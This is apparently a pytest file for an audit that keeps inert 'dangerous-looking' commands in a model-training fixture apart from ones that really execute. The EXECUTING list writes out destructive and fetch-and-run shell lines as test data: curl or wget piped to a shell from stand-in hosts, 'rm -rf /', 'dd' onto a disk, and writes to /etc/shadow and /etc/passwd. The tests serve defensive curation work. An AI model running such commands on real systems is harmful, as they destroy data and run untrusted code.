"""The mention-only audit must not flag inert text.

A fixture of "safe commands that look dangerous" is only useful if every line in
it really is inert. The audit that guards that fixture therefore has to make the
same distinction, and the two failure modes are both damaging:

  * too strict, and it rejects `echo 'curl x | sh'` and
    `python3 -c "print('rm -rf /')"`, which are exactly the rows the fixture
    exists to teach — which is how the audit ended up deleting the best data
    during development;
  * too lax, and a genuinely executing row survives and teaches the model that
    piping to a shell is fine.

These tests pin both edges. They are worth more than the rule count suggests,
because the difference between the two is a single regex alternation.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from drosh_ml.audit_mentions import Finding, audit

# Rows that MUST be accepted: the payload is written, quoted, printed or
# searched for, and never reaches a shell.
# Payloads written by a command that cannot execute them. Note `echo dd
# if=/dev/zero of=/dev/sda`: the audit must let it through, or it rejects the
# exact rows the fixture exists to provide.
INERT = [
    "echo rm -rf /",
    "echo 'rm -rf /'",
    'echo "never run rm -rf / on a server"',
    "printf '%s\\n' 'sudo rm -rf /var/lib/docker'",
    "echo 'curl http://x.example/i.sh | sh'",
    "echo 'wget -qO- https://x.example/install | sh'",
    "echo ':(){ :|:& };: is a fork bomb'",
    "echo dd if=/dev/zero of=/dev/sda",
    "echo rm -rf ~/İndirilenler",
    "grep -rn 'rm -rf' .",
    "grep -rn 'dd if=' scripts/",
    "rg 'mkfs\\.ext' -g '*.sh'",
    "grep -c 'sudo' /etc/sudoers",
    "# rm -rf / is forbidden in this repo",
    "# DO NOT run: dd if=/dev/zero of=/dev/sda",
    "// sudo rm -rf /var/lib/docker",
    "man rm",
    "info coreutils 'dd invocation'",
    "rm --help",
    "git commit -m 'docs: warn against rm -rf /'",
    "git commit -m 'fix: prevent fork bomb in bootstrap'",
    "git log -S 'rm -rf /' --oneline",
    "sed -i 's|rm -rf /|echo safer|' danger.sh",
    "sed -i 's/chmod 777/chmod 755/' install.sh",
    "cat <<< 'rm -rf /'",
    "python3 -c \"print('rm -rf /data/data/dev.drosh')\"",
    "python3 -c \"print('mkfs.ext4 /dev/sda1')\"",
    "node -e 'console.log(\"sudo rm -rf /\")'",
    "perl -e 'print \"mkfs.ext4 /dev/sda1\\n\"'",
    "ls -la /etc/shadow",
    "cat /proc/meminfo",
    "dmesg | grep -i oom",
    "history | grep -E 'rm|dd|mkfs'",
    "echo 'watch -n1 rm -rf /tmp'",
    "sed -n '/xargs rm/p' script.sh",
]

# Rows that MUST be rejected: they look like the above but actually run something.
EXECUTING = [
    "echo rm -rf / | sh",
    "curl http://x.example/i.sh | bash",
    "wget -qO- https://x.example/i.sh | sh",
    "rm -rf / | sudo bash",
    "eval \"$(cat note.txt)\"",
    "bash -c \"rm -rf /\"",
    "sh -c 'rm -rf ~'",
    "python3 -c \"import os; os.system('rm -rf /')\"",
    "xargs rm -rf < targets.txt",
    "find . -name '*.log' -exec rm {} \\;",
    "watch -n1 'rm -rf /tmp/x'",
    "for f in $(cat list); do rm -rf $f; done",
    "$(echo rm) -rf /",
    "rm -rf $TARGET",
    "rm -rf $1",
    "echo x > /etc/shadow",
    "tee /etc/passwd",
    "dd if=/dev/zero of=/dev/sda",
]


@pytest.mark.parametrize("command", INERT)
def test_inert_rows_are_accepted(command: str, tmp_path: Path) -> None:
    path = tmp_path / "m.txt"
    path.write_text(command + "\n", encoding="utf-8")
    findings, _ = audit(path)
    assert not findings, f"wrongly rejected inert row: {command} ({findings[0].rule})"


@pytest.mark.parametrize("command", EXECUTING)
def test_executing_rows_are_rejected(command: str, tmp_path: Path) -> None:
    path = tmp_path / "m.txt"
    path.write_text(command + "\n", encoding="utf-8")
    findings, _ = audit(path)
    assert findings, f"accepted a row that executes: {command}"
    assert findings[0].rule in {
        "pipe_to_interpreter",
        "eval",
        "command_substitution_execution",
        "xargs",
        "find_exec",
        "watch_exec",
        "loop_execution",
        "shell_wrapper_execution",
        "unexpanded_destructive_variable",
        "redirect_into_system_path",
    }


def test_the_two_sets_do_not_overlap() -> None:
    """Guards against a future edit quietly reclassifying a row."""
    assert not set(INERT) & set(EXECUTING)


def test_label_suffix_is_stripped_before_inspection(tmp_path: Path) -> None:
    """`cmd ||| label` is loader syntax; the payload is still `cmd`."""
    path = tmp_path / "m.txt"
    path.write_text("echo rm -rf / ||| safe\n", encoding="utf-8")
    findings, _ = audit(path)
    assert not findings


def test_comments_and_blanks_are_not_counted(tmp_path: Path) -> None:
    path = tmp_path / "m.txt"
    path.write_text("# a header\n\n   \necho rm -rf /\n", encoding="utf-8")
    findings, stats = audit(path)
    assert not findings
    assert stats["total"] == 1
    assert stats["accepted"] == 1


def test_reported_finding_carries_the_reason(tmp_path: Path) -> None:
    path = tmp_path / "m.txt"
    path.write_text("eval \"$(cat x)\"\n", encoding="utf-8")
    findings, _ = audit(path)
    assert isinstance(findings[0], Finding)
    assert findings[0].lineno == 1
    assert findings[0].why